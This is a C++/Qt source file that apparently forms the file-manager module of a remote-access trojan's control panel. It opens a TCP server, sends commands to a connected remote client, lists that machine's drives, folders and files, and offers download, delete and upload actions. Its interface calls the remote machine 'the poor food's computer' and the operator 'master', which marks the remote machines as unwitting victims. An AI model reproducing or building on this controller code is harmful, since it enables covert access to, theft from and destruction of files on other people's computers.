#include "file.h"

File::File(QWidget *parent) : QWidget(parent), mSock(nullptr)
{
    // 初始化路径
    _curFoodDir.setPath("");
    _curLocalDir.setPath(QDir::currentPath());

    // 初始化窗口
    const int w = 500, h = 600;
    const int x = (QApplication::desktop()->width() - w) >> 1;
    const int y = (QApplication::desktop()->height() - h) >> 1;
    // 固定大小
    this->setGeometry(x, y, w, h);
    this->setMinimumSize(w, h);
    this->setMaximumSize(w, h);

    // 设置提示
    QLabel *lbFood = new QLabel("可怜的食物的电脑:", this);
    lbFood->setGeometry(10,10,100,20);
    QLabel *lbLocal = new QLabel("主人您的电脑:", this);
    lbLocal->setGeometry(10,300,100,30);

    // 设置文件列表
    mFoodFileList = new QListWidget(this);
    mFoodFileList->setGeometry(10,30,480,260);
    mFoodFileList->setSelectionMode(QListWidget::SelectionMode::ExtendedSelection);
    connect(mFoodFileList, SIGNAL(itemDoubleClicked(QListWidgetItem*)), this, SLOT(loadFoodDir(QListWidgetItem *)));

    mLocalFileList = new QListWidget(this);
    mLocalFileList->setGeometry(10,330,480,260);
    mLocalFileList->setSelectionMode(QListWidget::SelectionMode::ExtendedSelection);
    connect(mLocalFileList, SIGNAL(itemDoubleClicked(QListWidgetItem*)), this, SLOT(loadLocalDir(QListWidgetItem *)));

    // 客户端列表的操作菜单
    mFoodMenu = new QMenu(this);
    QAction *actClientRefresh = mFoodMenu->addAction("刷新");
    connect(actClientRefresh,SIGNAL(triggered(bool)), this, SLOT(refreshFoodList()));
    QAction *actDownload = mFoodMenu->addAction("下载（只能对文件进行操作）");
    connect(actDownload,SIGNAL(triggered(bool)), this,SLOT(downloadFile()));
    QAction *actDelete = mFoodMenu->addAction("删除（只能对文件进行操作）");
    connect(actDelete, SIGNAL(triggered(bool)), this, SLOT(deleteFile()));

    // 在列表中增加鼠标事件监控，当右击点下时就能弹出菜单
    mFoodFileList->installEventFilter(this);

    // 本机列表的操作菜单
    mLocalMenu = new QMenu(this);
    QAction *actServerRefresh = mLocalMenu->addAction("刷新");
    connect(actServerRefresh,SIGNAL(triggered(bool)), this, SLOT(refreshLocalList()));
    QAction *actUpload= mLocalMenu->addAction("上传（只能对文件进行操作）");
    connect(actUpload,SIGNAL(triggered(bool)), this,SLOT(uploadFile()));

    // 在列表中增加鼠标事件监控，当右击点下时就能弹出菜单
    mLocalFileList->installEventFilter(this);
}

int File::startFileServer(QString userName)
{
    // 设置窗口标题
    _userName = userName;
    this->setWindowTitle(userName.append("-文件操作"));

    // 开启新的服务端
    mServer = new TcpServer(this);
    connect(mServer,SIGNAL(newConnection(QTcpSocket*)), this,SLOT(newConnection(QTcpSocket*)));

    mServer->start(0);
    if (!mServer->server()->isListening()) {
        qDebug() << "开启文件监控服务端失败";
        deleteLater();
        return -1;
    }

    // 开启监控窗口
    this->show();

    return mServer->server()->serverPort();
}

void File::addFilesToList(QListWidget *list, QList<QByteArray> strList, QFileIconProvider::IconType iconType, QString type)
{
    foreach (QByteArray bs, strList) {
        QString s = codec->toUnicode(bs);
        if (s.size() > 0) {
            QListWidgetItem *item = new QListWidgetItem(list);

            // 设置头像
            item->setIcon(QFileIconProvider().icon(iconType));

            // 设置类型(这个东西好神奇)
            item->setWhatsThis(type);

            // 增加文件到列表
            item->setText(s);
            list->addItem(item);
        }
    }
}

QStringList File::getCurrentFile(QListWidget *list)
{
    // 可以多选
    QStringList files;
    if (list->currentRow() >= 0) {
        QList<QListWidgetItem *> items = list->selectedItems();
        foreach(QListWidgetItem *it, items) {
            // 只获取文件
            if( it->whatsThis() == FileTypeFile ) {
                files.append(it->text());
            }
        }
    }
    return files;
}

QList<QByteArray> File::getLocalDrives()
{
    // 获取本机盘符
    QFileInfoList fileList = QDir::drives();
    QList<QByteArray> baList;
    foreach(QFileInfo info , fileList) {
        baList.append(codec->fromUnicode(info.filePath()));
    }
    return baList;
}

QList<QByteArray> File::getLocalDirs(QDir dir)
{
    // 获取目录下的所有目录
    QList<QByteArray> baList;
    QList<QString> strList = dir.entryList(QDir::Dirs);
    foreach(QString s, strList) {
        if (s!="." && s!="..") {
            baList.append(codec->fromUnicode(s));
        }
    }
    return baList;
}

// 这里TM的qt也太方便了吧。。。
QList<QByteArray> File::getLocalFiles(QDir dir)
{
    // 获取本机目录下的文件
    QList<QByteArray> baList;
    QList<QString> strList = dir.entryList(QDir::Files);
    foreach(QString s, strList) {
        baList.append(codec->fromUnicode(s));
    }
    return baList;
}

void File::processCommand(QByteArray &cmd, QByteArray &args)
{
    cmd = cmd.toUpper().trimmed();
    QHash<QByteArray, QByteArray> hashArgs = parseArgs(args);

    // 获取所有盘符
    if (cmd == CmdSendDrives) {
        doSendDrives(hashArgs);
        return;
    }

    // 获取客户端目录下的所有目录
    if (cmd == CmdSendDirs) {
        doSendDirs(hashArgs);
        return;
    }

    // 获取客户端目录下的所有文件
    if (cmd == CmdSendFiles) {
        doSendFiles(hashArgs);
        return;
    }

    // 删除文件成功
    if (cmd == CmdDeleteFileSuccess) {
        //QMessageBox::information(this, "提示","删除文件成功");
        return;
    }

    // 删除文件失败
    if (cmd == CmdDeleteFileFailed) {
        QMessageBox::warning(this, "提示","删除文件失败");
        return;
    }
}

QHash<QByteArray, QByteArray> File::parseArgs(QByteArray &args)
{
    QList<QByteArray> listArgs = args.split(CmdSplit[0]);

    // 分解参数，然后把它加入哈希表
    QHash<QByteArray, QByteArray> hashArgs;
    for(int i=0; i<listArgs.length()-1 ; i+=2) {
        hashArgs.insert(listArgs[i].toUpper().trimmed(),
                        listArgs[i+1].trimmed());
    }

    return hashArgs;
}

void File::doSendDrives(QHash<QByteArray, QByteArray> &args)
{
    // 重设路径
    _curFoodDir.setPath("");

    // 清空列表
    mFoodFileList->clear();

    // 打印到列表上
    QList<QByteArray> strList = args["DRIVES"].split(CmdFileSplit[0]);
    addFilesToList(mFoodFileList, strList, QFileIconProvider::Drive, FileTypeDrive);
}

void File::doSendDirs(QHash<QByteArray, QByteArray> &args)
{
    // 重设路径
    _curFoodDir.setPath(QString::fromLocal8Bit(args["DIR"]));

    // 清空列表
    mFoodFileList->clear();

    // 打印到列表上
    QList<QByteArray> strList = args["DIRS"].split(CmdFileSplit[0]);

    // 返回上一页名字
    strList.push_front(_dirBack);

    addFilesToList(mFoodFileList, strList, QFileIconProvider::Folder, FileTypeDir);
}

void File::doSendFiles(QHash<QByteArray, QByteArray> &args)
{
    // 打印到列表上
    QList<QByteArray> strList = args["FILES"].split(CmdFileSplit[0]);
    addFilesToList(mFoodFileList, strList, QFileIconProvider::File, FileTypeFile);
}

void File::loadFoodDir(QListWidgetItem *item)
{
    // 双击后加载新文件夹
    if (item->whatsThis() == FileTypeDir || item->whatsThis() == FileTypeDrive) {
        QDir dir;
        // 如果点击的是..
        if (item->text() == "..") {
            // 如果已经是在盘符了
            if (_curFoodDir.absolutePath().right(2) == ":/") {
                // 就是根目录
                dir.setPath("");
            } else {
                dir = QDir(_curFoodDir.absolutePath().left(_curFoodDir.absolutePath().lastIndexOf('/')+1));
            }
        } else {
            if (_curFoodDir.absolutePath().indexOf("/") == -1) {
                dir = QDir(_curFoodDir.absolutePath()+item->text());
            } else {
                dir = QDir(_curFoodDir.absolutePath()+"/"+item->text());
            }
        }
        qDebug() << dir;
        refreshFoodList(dir);
    }
}

void File::refreshFoodList()
{
    if (mSock) {
        // 获取当前路径下的所有文件
        // 拼接命令
        QString data;
        data.append(CmdGetDirFiles+CmdSplit);
        data.append("DIR"+CmdSplit+_curFoodDir.absolutePath());
        data.append(CmdEnd);
        mSock->write(codec->fromUnicode(data));
    }
}

void File::refreshFoodList(QDir dir)
{
    if (mSock) {
        // 获取当前路径下的所有文件
        QString data;
        data.append(CmdGetDirFiles+CmdSplit);
        data.append("DIR"+CmdSplit+dir.absolutePath());
        data.append(CmdEnd);
        mSock->write(codec->fromUnicode(data));
    }
}
